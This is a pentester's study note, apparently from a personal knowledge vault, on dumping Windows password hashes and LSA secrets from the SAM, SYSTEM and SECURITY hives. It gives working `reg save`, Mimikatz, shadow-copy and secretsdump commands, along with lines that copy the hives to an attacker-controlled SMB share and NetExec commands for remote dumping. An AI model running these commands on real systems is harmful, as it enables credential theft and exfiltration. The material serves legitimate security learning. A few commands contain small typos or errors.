---
created: 25-02-2026
tags:
  - Windows
  - password_attacks
  - Windows_credential_dumping
---

## About `SAM`, `SYSTEM`, and `SECURITY`

On local Windows machines, passwords are stored as NT hashes in the Windows registry — specifically, in the `HKLM\SAM`. Physically, the registry is implemented as a set of **hive files** under:

```powershell
%SystemRoot%\System32\config\
```

These hive files are loaded into memory and accessed via the kernel and user-mode APIs. Each hive is a structured binary database (not plain text file); keys, values, and data are stored in binary structures that user-mode routines read through the registry APIs. 

Important system hives relevant to credential dumping include:
- `HKLM\SAM`
- `HKLM\SYSTEM`
- `HKLM\SECURITY`

>[!note] To learn more about Windows registry, see [[registry]] and [`Windows Registry — Wikipedia`](https://en.wikipedia.org/wiki/Windows_Registry).
### SAM

>**SAM (Security Account Manager)** is a database file in Windows that stores local account names (users and groups), internal identifiers (RIDs), and **password hashes** (NT hashes; older builds could include LM hashes).

- With NT hashes of users' accounts, you can perform [[Pass-the-Hash]] attack, or try to crack them offline using [[Hashcat]] or [[JohnTheRipper]] to obtain plaintext passwords and authenticate normally.

- On disk, the SAM file is located at:

```powershell
%SystemRoot%\System32\config\SAM
```

>[!important] The `HKLM\SAM` key is not normally readable by non-privileged users. Access is restricted to `SYSTEM` and local administrator accounts.

- Passwords in SAM are not just hashed but also **encrypted** with the **machine key** stored in the **`SYSTEM` hive**.

### SYSTEM

>The **`SYSTEM` hive** stores general system configuration and state data; it's mounted at `HKLM\SYSTEM`.

- The configuration data stored in `SYSTEM` include control sets for drivers and services, system hardware profiles, RNG seed and other platform state, security subsystem configuration, and, most importantly for credential dumping, **the key material needed to decrypt SAM password hashes**.

The SAM encryption key, sometimes referred to as the `SYSKEY`, is derived from values stored in the `SYSTEM` hive.

### SECURITY

>The **`SECURITY` hive** stores holds local security policy data and **LSA secrets**.

- **LSA secrets**, stored in the registry under `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets`, include **system account credentials**, **NT/LM hashes**, **Domain Cached Credentials** (DCC1 and DCC2 hashes), **Kerberos tickets** (TGT, ST) and **keys** (AES, DES), and more.
- Kerberos TGTs (Ticket-Granting Tickets), for example, can later be used in [[Pass-the-Ticket]] attacks. 

## Credential dumping: SAM, SYSTEM, SECURITY

Before extracting data from the registry, you need a shell on behalf of `SYSTEM` or local Administrator (with `SeBackupPrivilege`; `Backup Operators` and `Administrators` groups typically have this privilege).

- To dump copies of the loaded hives, you can use the native Windows [`reg`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg) command:

```powershell
reg save HKLM\SAM C:\Windows\Temp\SAM.hive
```

```powershell
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive
```

```powershell
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY.hive
```

- Or [Mimikatz](https://github.com/gentilkiwi/mimikatz)'s `lsadump::sam` and `lsadump::secrets`:

```powershell
lsadump::sam
```

```powershell
lsadump::security
```

>[!important] You're dumping binary hive files from the running registry. 

>[!note] `reg save` bypasses ACL restrictions because it uses `SeBackupPrivilege`.

>[!tip]+
> If `reg save` is blocked (by policy/EDR), you can use Volume Shadow Copy to access offline hive files without locking issues:
> 
> ```powershell
> vssadmin create shadow /for=C:  
> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\Config\SAM C:\Windows\Temp\SAM.hive  
> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\Config\SYSTEM C:\Windows\Temp\SYSTEM.hive  
> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\Config\SECURITY C:\Windows\Temp\SECURITY.hive
> ```
> 
> This uses the shadow copy to safely read hive files that would otherwise be _in use_.

- Once you have the `.hive` files in a location under your control (e.g., `C:\Windows\Temp`), copy them to your attacker machine:

```bash
impacket-smbserver.py shared_folder ./
```

```powershell 
copy C:\Windows\Temp\SAM.hive \\<attacker_ip_address>\shared_folder\SAM.hive `
copy C:\Windows\Temp\SYSTEM.hive \\<attacker_ip_address>\shared_folder\SYSTEM.hive `
copy C:\Windows\Temp\SECURITY.hive \\
<attacker_ip_address>\shared_folder\SECURITY.hive
```

>[!note] See [[Linux_file_transfers]] and [[Windows_file_transfers]].

- On your machine, you can use **[`Impacket`](https://github.com/SecureAuthCorp/impacket)'s [`secretsdump.py`](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)  script** to parse the hive files and decrypt credential material:

```bash
secretsdump.py \
  -sam SAM.hive \
  -system SYSTEM.hive \
  -security SECURITY.hive \
  LOCAL
```

- `-sam`: local SAM database (local accounts & hashes).
- `-system`: system hive (decryption key material for SAM).
- `-security` (optional): LSA secrets.
- `LOCAL`: tells `secretsdump` that you’re extracting credentials stored on the local host and not connecting over the network.

### Dumping secrets remotely

Having valid credentials, you can extract credentials from `SAM`and `SECURITY` remotely. Tools that can be used to this purpose include:

>[`NetExec`](https://github.com/Pennyw0rth/NetExec):

- Dump SAM/LSA secrets remotely using username nad password to authenticate:

```bash
netexec smb <targets> -d <domain> -u <username> -p <password> --sam/--lsa
```

- With local user authentication:

```bash
netexec <targets> --local-auth -u <username> -p <password> --sam/--lsa
```

- Using [[Pass-the-Hash]] (NTLM):

```bash
netexec smb <targets> -d <domain> -u <username> -H <password> --sam/--lsa
```

- Using [[Pass-the-Ticket]] (Kerberos):

```bash
netexec smb <targets> --kerberos --sam/--lsa
```

>[!note] `secretsdump` and `NetExec` both extract security questions, if any, from the LSA. They're JSON-'formatted, UTF-16-LE encoded, and hex encoded on top of that (though it doesn't protect them at all).


>[`Impacket`](https://github.com/SecureAuthCorp/impacket)'s [`reg.py`](https://github.com/fortra/impacket/blob/master/examples/reg.py):

```bash
# start an SMB share
smbserver.py -smb2support "someshare" "./"

# save each hive manually
reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SAM' -o '\\ATTACKER_IPs\someshare'
reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SYSTEM' -o '\\ATTACKER_IP\someshare'
reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SECURITY' -o '\\ATTACKER_IP\someshare'

# backup all SAM, SYSTEM and SECURITY hives at once
reg.py "domain"/"user":"password"@"target" backup -o '\\ATTACKER_IP\someshare'
```


## References and further reading

- [`SAM & LSA secrets — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets)
- [`OS Credential Dumping: LSA Secrets — MITRW ATT&CK`](https://attack.mitre.org/techniques/T1003/004/)
- [`Security Account Manager — Wikipedia`](https://en.wikipedia.org/wiki/Security_Account_Manager)
- [`SecretsDump Demystified — Mike Benich, Medium`](https://medium.com/@benichmt1/secretsdump-demystified-bfd0f933dd9b)
- [`Credential Dumping: SAM — Hacking Articles`](https://www.hackingarticles.in/credential-dumping-sam/)